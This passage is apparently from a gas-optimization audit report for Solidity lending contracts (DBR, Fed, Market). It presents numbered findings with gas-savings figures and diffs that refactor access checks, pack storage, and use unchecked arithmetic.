   59,  64:     @param price The fixed price of the token. Remember to account for decimal precision when setting this.

   60,  65:     */

-  61     :-    function setFixedPrice(address token, uint price) public onlyOperator { fixedPrices[token] = price; }

+       66:+    function setFixedPrice(address token, uint price) public { 

+       67:+        onlyOperator();

+       68:+        fixedPrices[token] = price; 

+       69:+    }

   62,  70: 

   63,  71:     /**

   64,  72:     @notice Claims the operator role. Only successfully callable by the pending operator.
[03] Duplicated require()/revert() checks should be refactored to a modifier or function (instances)
Deployment. Gas Saved: 114 932

Minimum Method Call. Gas Saved: -59

Average Method Call. Gas Saved: -284

Maximum Method Call. Gas Saved: -398

Overall gas change: -2 665 (-12.599%)

src/Fed.sol:49, 58, 67, 76, 87, 88, 104, 105
diff --git a/src/Fed.sol b/src/Fed.sol

index 1e819bb..8b54676 100644

--- a/src/Fed.sol

+++ b/src/Fed.sol

@@ -41,12 +41,24 @@ contract Fed {

   41,  41:         supplyCeiling = _supplyCeiling;

   42,  42:     }

   43,  43: 

+       44:+    function is_gov() private view {

+       45:+        require(msg.sender == gov, "ONLY GOV");

+       46:+    }

+       47:+

+       48:+    function is_chair() private view {

+       49:+        require(msg.sender == chair, "ONLY CHAIR");

+       50:+    }

+       51:+

+       52:+    function is_supported_market(IMarket _market) private view {

+       53:+        require(dbr.markets(address(_market)), "UNSUPPORTED MARKET");

+       54:+    }

+       55:+

   44,  56:     /**

   45,  57:     @notice Change the governance of the Fed contact. Only callable by governance.

   46,  58:     @param _gov The address of the new governance contract

   47,  59:     */

   48,  60:     function changeGov(address _gov) public {

-  49     :-        require(msg.sender == gov, "ONLY GOV");

+       61:+        is_gov();

   50,  62:         gov = _gov;

   51,  63:     }

   52,  64: 

@@ -55,7 +67,7 @@ contract Fed {

   55,  67:     @param _supplyCeiling Amount to set the supply ceiling to

   56,  68:     */

   57,  69:     function changeSupplyCeiling(uint _supplyCeiling) public {

-  58     :-        require(msg.sender == gov, "ONLY GOV");

+       70:+        is_gov();

   59,  71:         supplyCeiling = _supplyCeiling;

   60,  72:     }

   61,  73: 

@@ -64,7 +76,7 @@ contract Fed {

   64,  76:     @param _chair Address of the new chair.

   65,  77:     */

   66,  78:     function changeChair(address _chair) public {

-  67     :-        require(msg.sender == gov, "ONLY GOV");

+       79:+        is_gov();

   68,  80:         chair = _chair;

   69,  81:     }

   70,  82: 

@@ -73,7 +85,7 @@ contract Fed {

   73,  85:     @dev Useful for immediately removing chair powers in case of a wallet compromise.

   74,  86:     */

   75,  87:     function resign() public {

-  76     :-        require(msg.sender == chair, "ONLY CHAIR");

+       88:+        is_chair();

   77,  89:         chair = address(0);

   78,  90:     }

   79,  91: 

@@ -84,8 +96,8 @@ contract Fed {

   84,  96:     @param amount The amount of DOLA to mint and supply to the market.

   85,  97:     */

   86,  98:     function expansion(IMarket market, uint amount) public {

-  87     :-        require(msg.sender == chair, "ONLY CHAIR");

-  88     :-        require(dbr.markets(address(market)), "UNSUPPORTED MARKET");

+       99:+        is_chair();

+      100:+        is_supported_market(market);

   89, 101:         require(market.borrowPaused() != true, "CANNOT EXPAND PAUSED MARKETS");

   90, 102:         dola.mint(address(market), amount);

   91, 103:         supplies[market] += amount;

@@ -101,8 +113,8 @@ contract Fed {

  101, 113:     @param amount The amount of DOLA to withdraw and burn.

  102, 114:     */

  103, 115:     function contraction(IMarket market, uint amount) public {

- 104     :-        require(msg.sender == chair, "ONLY CHAIR");

- 105     :-        require(dbr.markets(address(market)), "UNSUPPORTED MARKET");

+      116:+        is_chair();

+      117:+        is_supported_market(market);

  106, 118:         uint supply = supplies[market];

  107, 119:         require(amount <= supply, "AMOUNT TOO BIG"); // can't burn profits

  108, 120:         market.recall(amount);
src/DBR.sol:171, 195, 373
diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..625c422 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -46,6 +46,10 @@ contract DolaBorrowingRights {

   46,  46:         _;

   47,  47:     }

   48,  48:     

+       49:+    function is_balance_sufficient(address _user, uint256 amount) private view {

+       50:+        require(balanceOf(_user) >= amount, "Insufficient balance");

+       51:+    }

+       52:+

   49,  53:     /**

   50,  54:     @notice Sets pending operator of the contract. Operator role must be claimed by the new oprator. Only callable by Operator.

   51,  55:     @param newOperator_ The address of the newOperator

@@ -168,7 +172,7 @@ contract DolaBorrowingRights {

  168, 172:     @return Always returns true, will revert if not successful.

  169, 173:     */

  170, 174:     function transfer(address to, uint256 amount) public virtual returns (bool) {

- 171     :-        require(balanceOf(msg.sender) >= amount, "Insufficient balance");

+      175:+        is_balance_sufficient(msg.sender, amount);

  172, 176:         balances[msg.sender] -= amount;

  173, 177:         unchecked {

  174, 178:             balances[to] += amount;

@@ -192,7 +196,7 @@ contract DolaBorrowingRights {

  192, 196:     ) public virtual returns (bool) {

  193, 197:         uint256 allowed = allowance[from][msg.sender];

  194, 198:         if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

- 195     :-        require(balanceOf(from) >= amount, "Insufficient balance");

+      199:+        is_balance_sufficient(from, amount);

  196, 200:         balances[from] -= amount;

  197, 201:         unchecked {

  198, 202:             balances[to] += amount;

@@ -370,7 +374,7 @@ contract DolaBorrowingRights {

  370, 374:     @param amount Amount of DBR to be burned.

  371, 375:     */

  372, 376:     function _burn(address from, uint256 amount) internal virtual {

- 373     :-        require(balanceOf(from) >= amount, "Insufficient balance");

+      377:+        is_balance_sufficient(from, amount);

  374, 378:         balances[from] -= amount;

  375, 379:         unchecked {

  376, 380:             _totalSupply -= amount;
[04] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate (5 instances)
Deployment. Gas Saved: 24 227

Minimum Method Call. Gas Saved: 254

Average Method Call. Gas Saved: 533

Maximum Method Call. Gas Saved: -6 726

Overall gas change: -1 371 (20.741%)

Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - 30 gas) and that calculation’s associated stack operations.

src/DBR.sol:19, 23, 26, 27, 28
diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..43db0aa 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -8,6 +8,17 @@ pragma solidity ^0.8.13;

    8,   8: */

    9,   9: contract DolaBorrowingRights {

   10,  10: 

+       11:+    struct UserInfo {

+       12:+        uint256 balances;

+       13:+        

+       14:+        uint256 nonce;

+       15:+        uint256 debts;  // user => debt across all tracked markets

+       16:+        uint256 dueTokensAccrued; // user => amount of due tokens accrued

+       17:+        uint256 lastUpdated; // user => last update timestamp

+       18:+    }

+       19:+    

+       20:+    mapping(address => mapping(address => uint256)) public allowance;

+       21:+

   11,  22:     string public name;

   12,  23:     string public symbol;

   13,  24:     uint8 public constant decimals = 18;

@@ -16,16 +27,11 @@ contract DolaBorrowingRights {

   16,  27:     address public pendingOperator;

   17,  28:     uint public totalDueTokensAccrued;

   18,  29:     uint public replenishmentPriceBps;

-  19     :-    mapping(address => uint256) public balances;

-  20     :-    mapping(address => mapping(address => uint256)) public allowance;

+       30:+    mapping(address => UserInfo) public userInfo;

   21,  31:     uint256 internal immutable INITIAL_CHAIN_ID;

   22,  32:     bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;

-  23     :-    mapping(address => uint256) public nonces;

   24,  33:     mapping (address => bool) public minters;

   25,  34:     mapping (address => bool) public markets;

-  26     :-    mapping (address => uint) public debts; // user => debt across all tracked markets

-  27     :-    mapping (address => uint) public dueTokensAccrued; // user => amount of due tokens accrued

-  28     :-    mapping (address => uint) public lastUpdated; // user => last update timestamp

   29,  35: 

   30,  36:     constructor(

   31,  37:         uint _replenishmentPriceBps,

@@ -118,10 +124,10 @@ contract DolaBorrowingRights {

  118, 124:     @return uint representing the balance of the user.

  119, 125:     */

  120, 126:     function balanceOf(address user) public view returns (uint) {

- 121     :-        uint debt = debts[user];

- 122     :-        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

- 123     :-        if(dueTokensAccrued[user] + accrued > balances[user]) return 0;

- 124     :-        return balances[user] - dueTokensAccrued[user] - accrued;

+      127:+        uint debt = userInfo[user].debts;

+      128:+        uint accrued = (block.timestamp - userInfo[user].lastUpdated) * debt / 365 days;

+      129:+        if(userInfo[user].dueTokensAccrued + accrued > userInfo[user].balances) return 0;

+      130:+        return userInfo[user].balances - userInfo[user].dueTokensAccrued - accrued;

  125, 131:     }

  126, 132: 

  127, 133:     /**

@@ -131,10 +137,10 @@ contract DolaBorrowingRights {

  131, 137:     @return uint representing the deficit of the user.

  132, 138:     */

  133, 139:     function deficitOf(address user) public view returns (uint) {

- 134     :-        uint debt = debts[user];

- 135     :-        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

- 136     :-        if(dueTokensAccrued[user] + accrued < balances[user]) return 0;

- 137     :-        return dueTokensAccrued[user] + accrued - balances[user];

+      140:+        uint debt = userInfo[user].debts;

+      141:+        uint accrued = (block.timestamp - userInfo[user].lastUpdated) * debt / 365 days;

+      142:+        if(userInfo[user].dueTokensAccrued + accrued < userInfo[user].balances) return 0;

+      143:+        return userInfo[user].dueTokensAccrued + accrued - userInfo[user].balances;

  138, 144:     }

  139, 145:     

  140, 146:     /**

@@ -144,9 +150,9 @@ contract DolaBorrowingRights {

  144, 150:     @return Returns a signed int of the user's balance

  145, 151:     */

  146, 152:     function signedBalanceOf(address user) public view returns (int) {

- 147     :-        uint debt = debts[user];

- 148     :-        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

- 149     :-        return int(balances[user]) - int(dueTokensAccrued[user]) - int(accrued);

+      153:+        uint debt = userInfo[user].debts;

+      154:+        uint accrued = (block.timestamp - userInfo[user].lastUpdated) * debt / 365 days;

+      155:+        return int(userInfo[user].balances) - int(userInfo[user].dueTokensAccrued) - int(accrued);

  150, 156:     }

  151, 157: 

  152, 158:     /**

@@ -169,9 +175,9 @@ contract DolaBorrowingRights {

  169, 175:     */

  170, 176:     function transfer(address to, uint256 amount) public virtual returns (bool) {

  171, 177:         require(balanceOf(msg.sender) >= amount, "Insufficient balance");

- 172     :-        balances[msg.sender] -= amount;

+      178:+        userInfo[msg.sender].balances -= amount;

  173, 179:         unchecked {

- 174     :-            balances[to] += amount;

+      180:+            userInfo[to].balances += amount;

  175, 181:         }

  176, 182:         emit Transfer(msg.sender, to, amount);

  177, 183:         return true;

@@ -193,9 +199,9 @@ contract DolaBorrowingRights {

  193, 199:         uint256 allowed = allowance[from][msg.sender];

  194, 200:         if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

  195, 201:         require(balanceOf(from) >= amount, "Insufficient balance");

- 196     :-        balances[from] -= amount;

+      202:+        userInfo[from].balances -= amount;

  197, 203:         unchecked {

- 198     :-            balances[to] += amount;

+      204:+            userInfo[to].balances += amount;

  199, 205:         }

  200, 206:         emit Transfer(from, to, amount);

  201, 207:         return true;

@@ -236,7 +242,7 @@ contract DolaBorrowingRights {

  236, 242:                                 owner,

  237, 243:                                 spender,

  238, 244:                                 value,

- 239     :-                                nonces[owner]++,

+      245:+                                userInfo[owner].nonce++,

  240, 246:                                 deadline

  241, 247:                             )

  242, 248:                         )

@@ -256,7 +262,7 @@ contract DolaBorrowingRights {

  256, 262:     @notice Function for invalidating the nonce of a signed message.

  257, 263:     */

  258, 264:     function invalidateNonce() public {

- 259     :-        nonces[msg.sender]++;

+      265:+        userInfo[msg.sender].nonce++;

  260, 266:     }

  261, 267: 

  262, 268:     function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {

@@ -282,12 +288,12 @@ contract DolaBorrowingRights {

  282, 288:     @param user The address of the user to accrue DBR debt to.

  283, 289:     */

  284, 290:     function accrueDueTokens(address user) public {

- 285     :-        uint debt = debts[user];

- 286     :-        if(lastUpdated[user] == block.timestamp) return;

- 287     :-        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

- 288     :-        dueTokensAccrued[user] += accrued;

+      291:+        uint debt = userInfo[user].debts;

+      292:+        if(userInfo[user].lastUpdated == block.timestamp) return;

+      293:+        uint accrued = (block.timestamp - userInfo[user].lastUpdated) * debt / 365 days;

+      294:+        userInfo[user].dueTokensAccrued += accrued;

  289, 295:         totalDueTokensAccrued += accrued;

- 290     :-        lastUpdated[user] = block.timestamp;

+      296:+        userInfo[user].lastUpdated = block.timestamp;

  291, 297:         emit Transfer(user, address(0), accrued);

  292, 298:     }

  293, 299: 

@@ -301,7 +307,7 @@ contract DolaBorrowingRights {

  301, 307:         require(markets[msg.sender], "Only markets can call onBorrow");

  302, 308:         accrueDueTokens(user);

  303, 309:         require(deficitOf(user) == 0, "DBR Deficit");

- 304     :-        debts[user] += additionalDebt;

+      310:+        userInfo[user].debts += additionalDebt;

  305, 311:     }

  306, 312: 

  307, 313:     /**

@@ -313,7 +319,7 @@ contract DolaBorrowingRights {

  313, 319:     function onRepay(address user, uint repaidDebt) public {

  314, 320:         require(markets[msg.sender], "Only markets can call onRepay");

  315, 321:         accrueDueTokens(user);

- 316     :-        debts[user] -= repaidDebt;

+      322:+        userInfo[user].debts -= repaidDebt;

  317, 323:     }

  318, 324: 

  319, 325:     /**

@@ -329,7 +335,7 @@ contract DolaBorrowingRights {

  329, 335:         require(deficit >= amount, "Amount > deficit");

  330, 336:         uint replenishmentCost = amount * replenishmentPriceBps / 10000;

  331, 337:         accrueDueTokens(user);

- 332     :-        debts[user] += replenishmentCost;

+      338:+        userInfo[user].debts += replenishmentCost;

  333, 339:         _mint(user, amount);

  334, 340:     }

  335, 341: 

@@ -359,7 +365,7 @@ contract DolaBorrowingRights {

  359, 365:     function _mint(address to, uint256 amount) internal virtual {

  360, 366:         _totalSupply += amount;

  361, 367:         unchecked {

- 362     :-            balances[to] += amount;

+      368:+            userInfo[to].balances += amount;

  363, 369:         }

  364, 370:         emit Transfer(address(0), to, amount);

  365, 371:     }

@@ -371,7 +377,7 @@ contract DolaBorrowingRights {

  371, 377:     */

  372, 378:     function _burn(address from, uint256 amount) internal virtual {

  373, 379:         require(balanceOf(from) >= amount, "Insufficient balance");

- 374     :-        balances[from] -= amount;

+      380:+        userInfo[from].balances -= amount;

  375, 381:         unchecked {

  376, 382:             _totalSupply -= amount;

  377, 383:         }

diff --git a/src/test/DBR.t.sol b/src/test/DBR.t.sol

index 3988cf7..754bf7f 100644

--- a/src/test/DBR.t.sol

+++ b/src/test/DBR.t.sol

@@ -145,17 +145,19 @@ contract DBRTest is FiRMTest {

  145, 145:     }

  146, 146: 

  147, 147:     function test_invalidateNonce() public {

- 148     :-        assertEq(dbr.nonces(user), 0, "User nonce should be uninitialized");

+      148:+        (, uint256 nonce,,,) = dbr.userInfo(user);

+      149:+        assertEq(nonce, 0, "User nonce should be uninitialized");

  149, 150: 

  150, 151:         vm.startPrank(user);

  151, 152:         dbr.invalidateNonce();

  152, 153: 

- 153     :-        assertEq(dbr.nonces(user), 1, "User nonce was not invalidated");

+      154:+        (,nonce,,,) = dbr.userInfo(user);

+      155:+        assertEq(nonce, 1, "User nonce was not invalidated");

  154, 156:     }

  155, 157: 

  156, 158:     function test_approve_increasesAllowanceByAmount() public {

  157, 159:         uint amount = 100e18;

- 158     :-

+      160:+        

  159, 161:         assertEq(dbr.allowance(user, gov), 0, "Allowance should not be set yet");

  160, 162: 

  161, 163:         vm.startPrank(user);
[05] Expression can be unchecked when overflow is not possible (6 instances)
Deployment. Gas Saved: 20 220

Minimum Method Call. Gas Saved: 410

Average Method Call. Gas Saved: 4 630

Maximum Method Call. Gas Saved: 1 354

Overall gas change: -6 233 (-5.326%)

src/DBR.sol:110, 124, 137, 259
diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..0781c97 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -107,8 +107,10 @@ contract DolaBorrowingRights {

  107, 107:     @return uint representing the total supply of DBR.

  108, 108:     */

  109, 109:     function totalSupply() public view returns (uint) {

- 110     :-        if(totalDueTokensAccrued > _totalSupply) return 0;

- 111     :-        return _totalSupply - totalDueTokensAccrued;

+      110:+        unchecked {

+      111:+            if(totalDueTokensAccrued > _totalSupply) return 0;

+      112:+            return _totalSupply - totalDueTokensAccrued;

+      113:+        }

  112, 114:     }

  113, 115: 

  114, 116:     /**

@@ -121,7 +123,7 @@ contract DolaBorrowingRights {

  121, 123:         uint debt = debts[user];

  122, 124:         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

  123, 125:         if(dueTokensAccrued[user] + accrued > balances[user]) return 0;

- 124     :-        return balances[user] - dueTokensAccrued[user] - accrued;

+      126:+        unchecked { return balances[user] - dueTokensAccrued[user] - accrued; }

  125, 127:     }

  126, 128: 

  127, 129:     /**

@@ -134,7 +136,7 @@ contract DolaBorrowingRights {

  134, 136:         uint debt = debts[user];

  135, 137:         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

  136, 138:         if(dueTokensAccrued[user] + accrued < balances[user]) return 0;

- 137     :-        return dueTokensAccrued[user] + accrued - balances[user];

+      139:+        unchecked { return dueTokensAccrued[user] + accrued - balances[user]; }

  138, 140:     }

  139, 141:     

  140, 142:     /**

@@ -256,7 +258,7 @@ contract DolaBorrowingRights {

  256, 258:     @notice Function for invalidating the nonce of a signed message.

  257, 259:     */

  258, 260:     function invalidateNonce() public {

- 259     :-        nonces[msg.sender]++;

+      261:+        unchecked { nonces[msg.sender]++; }

  260, 262:     }

  261, 263: 

  262, 264:     function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
src/Fed.sol:124
diff --git a/src/Fed.sol b/src/Fed.sol

index 1e819bb..b57b444 100644

--- a/src/Fed.sol

+++ b/src/Fed.sol

@@ -121,7 +121,7 @@ contract Fed {

  121, 121:         uint marketValue = dola.balanceOf(address(market)) + market.totalDebt();

  122, 122:         uint supply = supplies[market];

  123, 123:         if(supply >= marketValue) return 0;

- 124     :-        return marketValue - supply;

+      124:+        unchecked { return marketValue - supply; }

  125, 125:     }

  126, 126: 

  127, 127:     /**
src/Market.sol:521
diff --git a/src/Market.sol b/src/Market.sol

index 9585b85..293bbb6 100644

--- a/src/Market.sol

+++ b/src/Market.sol

@@ -518,7 +518,7 @@ contract Market {

  518, 518:     @notice Function for incrementing the nonce of the msg.sender, making their latest signed message unusable.

  519, 519:     */

  520, 520:     function invalidateNonce() public {

- 521     :-        nonces[msg.sender]++;

+      521:+        unchecked { nonces[msg.sender]++; }

  522, 522:     }

  523, 523:     

  524, 524:     /**
[06] State variables can be packed into fewer storage slots (1 instance)
Deployment. Gas Saved: -5 008

Minimum Method Call. Gas Saved: 1 911

Average Method Call. Gas Saved: 15 525

Maximum Method Call. Gas Saved: 20 972

Overall gas change: -62 419 (-69.524%)

If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper

uint256(32), mapping(32), address(20), bool(1)

src/Market.sol:53
diff --git a/src/Market.sol b/src/Market.sol

index 9585b85..6141e5c 100644

--- a/src/Market.sol

+++ b/src/Market.sol

@@ -36,6 +36,7 @@ interface IBorrowController {

   36,  36: contract Market {

   37,  37: 

   38,  38:     address public gov;

+       39:+    bool public borrowPaused;

   39,  40:     address public lender;

   40,  41:     address public pauseGuardian;

   41,  42:     address public immutable escrowImplementation;

@@ -50,7 +51,6 @@ contract Market {

   50,  51:     uint public liquidationFeeBps;

   51,  52:     uint public liquidationFactorBps = 5000; // 50% by default

   52,  53:     bool immutable callOnDepositCallback;

-  53     :-    bool public borrowPaused;

   54,  54:     uint public totalDebt;

   55,  55:     uint256 internal immutable INITIAL_CHAIN_ID;

   56,  56:     bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;
[07] Refactoring similar statements (1 instance)
Deployment. Gas Saved: 18 422

Minimum Method Call. Gas Saved: -18

Average Method Call. Gas Saved: -11

Maximum Method Call. Gas Saved: 6

Overall gas change: 4 876 (7.739%)

src/Market.sol:213
diff --git a/src/Market.sol b/src/Market.sol

index 9585b85..da295e5 100644

--- a/src/Market.sol

+++ b/src/Market.sol

@@ -210,11 +210,9 @@ contract Market {

  210, 210:     @param _value Boolean representing the state pause state of borrows. true = paused, false = unpaused.

  211, 211:     */

  212, 212:     function pauseBorrows(bool _value) public {

- 213     :-        if(_value) {

- 214     :-            require(msg.sender == pauseGuardian || msg.sender == gov, "Only pause guardian or governance can pause");

- 215     :-        } else {

- 216     :-            require(msg.sender == gov, "Only governance can unpause");

- 217     :-        }

+      213:+        require(

+      214:+            ( _value && msg.sender == pauseGuardian) || msg.sender == gov,

+      215:+            "Only pause guardian or governance can pause");

  218, 216:         borrowPaused = _value;

  219, 217:     }

  220, 218: 

diff --git a/src/test/Market.t.sol b/src/test/Market.t.sol

index 8992ab9..86af449 100644

--- a/src/test/Market.t.sol

+++ b/src/test/Market.t.sol

@@ -16,7 +16,7 @@ import "./mocks/BorrowContract.sol";

   16,  16: import {EthFeed} from "./mocks/EthFeed.sol";

   17,  17: 

   18,  18: contract MarketTest is FiRMTest {

-  19     :-    bytes onlyGovUnpause = "Only governance can unpause";

+       19:+    bytes onlyGovUnpause = "Only pause guardian or governance can pause";

   20,  20:     bytes onlyPauseGuardianOrGov = "Only pause guardian or governance can pause";

   21,  21: 

   22,  22:     BorrowContract borrowContract;
[08] Better algorithm for underflow check (3 instances)
Deployment. Gas Saved: 12 613

Minimum Method Call. Gas Saved: 656

Average Method Call. Gas Saved: 8 332

Maximum Method Call. Gas Saved: 3 741

Overall gas change: -18 048 (-15.981%)

src/DBR.sol:110, 123, 136
diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..bff9fef 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -104,37 +104,39 @@ contract DolaBorrowingRights {

  104, 104:     /**

  105, 105:     @notice Get the total supply of DBR tokens.

  106, 106:     @dev The total supply is calculated as the difference between total DBR minted and total DBR accrued.

- 107     :-    @return uint representing the total supply of DBR.

+      107:+    @return ret uint representing the total supply of DBR.

  108, 108:     */

- 109     :-    function totalSupply() public view returns (uint) {

- 110     :-        if(totalDueTokensAccrued > _totalSupply) return 0;

- 111     :-        return _totalSupply - totalDueTokensAccrued;

+      109:+    function totalSupply() public view returns (uint ret) {

+      110:+        unchecked { ret = _totalSupply - totalDueTokensAccrued; }

+      111:+        if(ret > _totalSupply) return 0;

  112, 112:     }

  113, 113: 

  114, 114:     /**

  115, 115:     @notice Get the DBR balance of an address. Will return 0 if the user has zero DBR or a deficit.

  116, 116:     @dev The balance of a user is calculated as the difference between the user's balance and the user's accrued DBR debt + due DBR debt.

  117, 117:     @param user Address of the user.

- 118     :-    @return uint representing the balance of the user.

+      118:+    @return ret uint representing the balance of the user.

  119, 119:     */

- 120     :-    function balanceOf(address user) public view returns (uint) {

+      120:+    function balanceOf(address user) public view returns (uint ret) {

  121, 121:         uint debt = debts[user];

  122, 122:         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

- 123     :-        if(dueTokensAccrued[user] + accrued > balances[user]) return 0;

- 124     :-        return balances[user] - dueTokensAccrued[user] - accrued;

+      123:+        uint mid = dueTokensAccrued[user] + accrued;

+      124:+        unchecked { ret = balances[user] - mid; }

+      125:+        if(ret > balances[user]) return 0;

  125, 126:     }

  126, 127: 

  127, 128:     /**

  128, 129:     @notice Get the DBR deficit of an address. Will return 0 if th user has zero DBR or more.

  129, 130:     @dev The deficit of a user is calculated as the difference between the user's accrued DBR deb + due DBR debt and their balance.

  130, 131:     @param user Address of the user.

- 131     :-    @return uint representing the deficit of the user.

+      132:+    @return ret uint representing the deficit of the user.

  132, 133:     */

- 133     :-    function deficitOf(address user) public view returns (uint) {

+      134:+    function deficitOf(address user) public view returns (uint ret) {

  134, 135:         uint debt = debts[user];

  135, 136:         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

- 136     :-        if(dueTokensAccrued[user] + accrued < balances[user]) return 0;

- 137     :-        return dueTokensAccrued[user] + accrued - balances[user];

+      137:+        uint mid = dueTokensAccrued[user] + accrued;

+      138:+        unchecked { ret = mid - balances[user]; }

+      139:+        if(mid < ret) return 0;

  138, 140:     }

  139, 141:     

  140, 142:     /**
[09] x = x + y is cheaper than x += y (12 instances)
Deployment. Gas Saved: 11 214

Minimum Method Call. Gas Saved: 180

Average Method Call. Gas Saved: 468

Maximum Method Call. Gas Saved: 616

Overall gas change: -5 325 (-1.318%)

src/DBR.sol:174, 196, 289, 360, 362, 376
diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..c02b782 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -171,7 +171,7 @@ contract DolaBorrowingRights {

  171, 171:         require(balanceOf(msg.sender) >= amount, "Insufficient balance");

  172, 172:         balances[msg.sender] -= amount;

  173, 173:         unchecked {

- 174     :-            balances[to] += amount;

+      174:+            balances[to] = balances[to] + amount;

  175, 175:         }

  176, 176:         emit Transfer(msg.sender, to, amount);

  177, 177:         return true;

@@ -193,7 +193,7 @@ contract DolaBorrowingRights {

  193, 193:         uint256 allowed = allowance[from][msg.sender];

  194, 194:         if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

  195, 195:         require(balanceOf(from) >= amount, "Insufficient balance");

- 196     :-        balances[from] -= amount;

+      196:+        balances[from] = balances[from] - amount;

  197, 197:         unchecked {

  198, 198:             balances[to] += amount;

  199, 199:         }

@@ -286,7 +286,7 @@ contract DolaBorrowingRights {

  286, 286:         if(lastUpdated[user] == block.timestamp) return;

  287, 287:         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;

  288, 288:         dueTokensAccrued[user] += accrued;

- 289     :-        totalDueTokensAccrued += accrued;

+      289:+        totalDueTokensAccrued = totalDueTokensAccrued + accrued;

  290, 290:         lastUpdated[user] = block.timestamp;

  291, 291:         emit Transfer(user, address(0), accrued);

  292, 292:     }

@@ -357,9 +357,9 @@ contract DolaBorrowingRights {

  357, 357:     @param amount Amount of DBR to mint.

  358, 358:     */

  359, 359:     function _mint(address to, uint256 amount) internal virtual {

- 360     :-        _totalSupply += amount;

+      360:+        _totalSupply = _totalSupply + amount;

  361, 361:         unchecked {

- 362     :-            balances[to] += amount;

+      362:+            balances[to] = balances[to] + amount;

  363, 363:         }

  364, 364:         emit Transfer(address(0), to, amount);

  365, 365:     }

@@ -373,7 +373,7 @@ contract DolaBorrowingRights {

  373, 373:         require(balanceOf(from) >= amount, "Insufficient balance");

  374, 374:         balances[from] -= amount;

  375, 375:         unchecked {

- 376     :-            _totalSupply -= amount;

+      376:+            _totalSupply = _totalSupply - amount;

  377, 377:         }

  378, 378:         emit Transfer(from, address(0), amount);

  379, 379:     }
src/Market.sol:395, 397, 535, 568, 598, 600
diff --git a/src/Market.sol b/src/Market.sol

index 9585b85..bc0ff93 100644

--- a/src/Market.sol

+++ b/src/Market.sol

@@ -392,9 +392,9 @@ contract Market {

  392, 392:             require(borrowController.borrowAllowed(msg.sender, borrower, amount), "Denied by borrow controller");

  393, 393:         }

  394, 394:         uint credit = getCreditLimitInternal(borrower);

- 395     :-        debts[borrower] += amount;

+      395:+        debts[borrower] = debts[borrower] + amount;

  396, 396:         require(credit >= debts[borrower], "Exceeded credit limit");

- 397     :-        totalDebt += amount;

+      397:+        totalDebt = totalDebt + amount;

  398, 398:         dbr.onBorrow(borrower, amount);

  399, 399:         dola.transfer(to, amount);

  400, 400:         emit Borrow(borrower, amount);

@@ -532,7 +532,7 @@ contract Market {

  532, 532:         uint debt = debts[user];

  533, 533:         require(debt >= amount, "Insufficient debt");

  534, 534:         debts[user] -= amount;

- 535     :-        totalDebt -= amount;

+      535:+        totalDebt = totalDebt - amount;

  536, 536:         dbr.onRepay(user, amount);

  537, 537:         dola.transferFrom(msg.sender, address(this), amount);

  538, 538:         emit Repay(user, msg.sender, amount);

@@ -565,7 +565,7 @@ contract Market {

  565, 565:         debts[user] += replenishmentCost;

  566, 566:         uint collateralValue = getCollateralValueInternal(user);

  567, 567:         require(collateralValue >= debts[user], "Exceeded collateral value");

- 568     :-        totalDebt += replenishmentCost;

+      568:+        totalDebt = totalDebt + replenishmentCost;

  569, 569:         dbr.onForceReplenish(user, amount);

  570, 570:         dola.transfer(msg.sender, replenisherReward);

  571, 571:         emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward);

@@ -595,9 +595,9 @@ contract Market {

  595, 595:         require(repaidDebt <= debt * liquidationFactorBps / 10000, "Exceeded liquidation factor");

  596, 596:         uint price = oracle.getPrice(address(collateral), collateralFactorBps);

  597, 597:         uint liquidatorReward = repaidDebt * 1 ether / price;

- 598     :-        liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;

+      598:+        liquidatorReward = liquidatorReward + liquidatorReward * liquidationIncentiveBps / 10000;

  599, 599:         debts[user] -= repaidDebt;

- 600     :-        totalDebt -= repaidDebt;

+      600:+        totalDebt = totalDebt - repaidDebt;

  601, 601:         dbr.onRepay(user, repaidDebt);

  602, 602:         dola.transferFrom(msg.sender, address(this), repaidDebt);

  603, 603:         IEscrow escrow = predictEscrow(user);
[10] internal functions only called once can be inlined to save gas (1 instance)
Deployment. Gas Saved: 5 207

Minimum Method Call. Gas Saved: 67

Average Method Call. Gas Saved: 47

Maximum Method Call. Gas Saved: 24

Overall gas change: -137 (-0.154%)

src/DBR.sol:341
diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..a357f92 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -338,7 +338,12 @@ contract DolaBorrowingRights {

  338, 338:     @param amount Amount to be burned

  339, 339:     */

  340, 340:     function burn(uint amount) public {

- 341     :-        _burn(msg.sender, amount);

